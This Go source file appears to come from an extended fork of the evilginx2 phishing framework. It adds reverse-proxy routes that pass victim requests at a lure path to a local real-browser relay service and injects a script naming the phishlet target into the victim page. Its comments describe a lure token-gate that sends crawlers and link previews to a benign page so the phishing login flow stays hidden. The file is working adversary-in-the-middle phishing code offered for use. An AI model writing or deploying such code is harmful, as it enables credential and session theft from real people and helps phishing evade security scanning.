// evilginx2-extended (fork): /__relay/* reverse-proxy routes to the bgrelay sidecar.
package core

import (
	"bytes"
	"context"
	"io/ioutil"
	"net/http"
	"net/http/httptest"
	"net/http/httputil"
	"net/url"
	"os"
	"strconv"
	"strings"

	"github.com/elazarl/goproxy"
)

// relayPage serves the relay sidecar's victim page at the lure path. The
// phishlet name rides along as ?target= so the sidecar picks the right
// relay profile (profiles/<phishlet>.yaml) for ANY target.
func (p *HttpProxy) relayPage(req *http.Request, phishlet string) (*http.Request, *http.Response) {
	backend := os.Getenv("EG_RELAY_BACKEND")
	if backend == "" {
		backend = "http://127.0.0.1:9445"
	}
	u, err := url.Parse(backend)
	if err != nil {
		return p.blockRequest(req)
	}
	rp := httputil.NewSingleHostReverseProxy(u)
	rr := httptest.NewRecorder()
	r2 := req.Clone(context.Background())
	r2.URL.Path = "/"
	r2.URL.RawPath = ""
	r2.RequestURI = ""
	if phishlet != "" {
		q := r2.URL.Query()
		q.Set("target", phishlet)
		r2.URL.RawQuery = q.Encode()
	}
	rp.ServeHTTP(rr, r2)
	body := rr.Body.Bytes()
	// the victim's address bar keeps the lure URL, so the page cannot read
	// ?target= from location — inject it as a global before the page script
	if ct := rr.Header().Get("Content-Type"); strings.Contains(ct, "text/html") && phishlet != "" {
		inj := []byte("<script>window.__RELAY_TARGET__=" + strconv.Quote(phishlet) + ";</script>")
		if i := bytes.Index(bytes.ToLower(body), []byte("<head>")); i >= 0 {
			i += len("<head>")
			nb := make([]byte, 0, len(body)+len(inj))
			nb = append(nb, body[:i]...)
			nb = append(nb, inj...)
			body = append(nb, body[i:]...)
		}
	}
	resp := goproxy.NewResponse(req, "text/html", rr.Code, "")
	if resp != nil {
		resp.Body = ioutil.NopCloser(bytes.NewReader(body))
		resp.ContentLength = int64(len(body))
		if ct := rr.Header().Get("Content-Type"); ct != "" {
			resp.Header.Set("Content-Type", ct)
		}
		return req, resp
	}
	return p.blockRequest(req)
}

// relayRequest reverse-proxies /__relay/* to the local real-browser relay
// service (EG_RELAY_BACKEND, default http://127.0.0.1:9445). Buffered via a
// recorder — relay payloads are small JSON/HTML, no streaming needed.

func (p *HttpProxy) relayRequest(req *http.Request) (*http.Request, *http.Response) {
	backend := os.Getenv("EG_RELAY_BACKEND")
	if backend == "" {
		backend = "http://127.0.0.1:9445"
	}
	u, err := url.Parse(backend)
	if err != nil {
		return p.blockRequest(req)
	}
	rp := httputil.NewSingleHostReverseProxy(u)
	rr := httptest.NewRecorder()
	r2 := req.Clone(context.Background())
	r2.URL.Path = strings.TrimPrefix(req.URL.Path, "/__relay")
	if r2.URL.Path == "" {
		r2.URL.Path = "/"
	}
	r2.URL.RawPath = ""
	r2.RequestURI = ""
	rp.ServeHTTP(rr, r2)
	resp := goproxy.NewResponse(req, "text/html", rr.Code, "")
	if resp != nil {
		resp.Body = ioutil.NopCloser(bytes.NewReader(rr.Body.Bytes()))
		resp.ContentLength = int64(rr.Body.Len())
		ct := rr.Header().Get("Content-Type")
		if ct != "" {
			resp.Header.Set("Content-Type", ct)
		}
		return req, resp
	}
	return p.blockRequest(req)
}

// blockRedirect sends the requestor to a benign URL — used by the lure
// token-gate so crawlers and link previews land on a harmless page instead
// of the proxied login flow.
